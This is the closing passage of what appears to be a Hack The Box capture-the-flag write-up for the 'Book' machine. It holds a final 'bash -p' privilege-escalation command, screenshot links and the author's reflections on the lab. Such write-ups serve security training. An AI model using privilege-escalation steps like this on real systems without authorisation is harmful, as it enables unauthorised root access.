bash -p
```

<br />
<img src="{{ site.img_path }}/book_writeup/Book_86.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_87.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/book_writeup/Book_88.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/book_writeup/Book_89.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> Another excellent machine from **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** that combines vulnerabilities, technologies, techniques and research so that people in the field of **Computer Security** can grow professionally. I had a lot of fun, but my frustration levels almost reached their limit when I stalled at the beginning and couldn't find the attack vector. I had to invest a lot of time in the **Engagement** of the box but I got a great sense of job accomplished when I managed to finish it, it's time to kill the machine and move on to the next **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** lab.

<br /><br />
<img src="{{ site.img_path }}/book_writeup/Book_90.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
